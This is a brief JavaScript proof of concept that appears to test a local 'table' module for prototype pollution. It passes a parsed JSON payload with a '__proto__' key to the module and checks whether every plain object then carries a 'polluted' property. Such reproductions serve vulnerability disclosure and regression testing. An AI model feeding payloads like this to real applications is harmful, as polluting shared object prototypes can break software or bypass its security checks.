const table = require("../src");

console.log({}.polluted);
malicious = '{"__proto__": {"polluted": "Polluted!"}}';
table(JSON.parse(malicious));
console.log({}.polluted);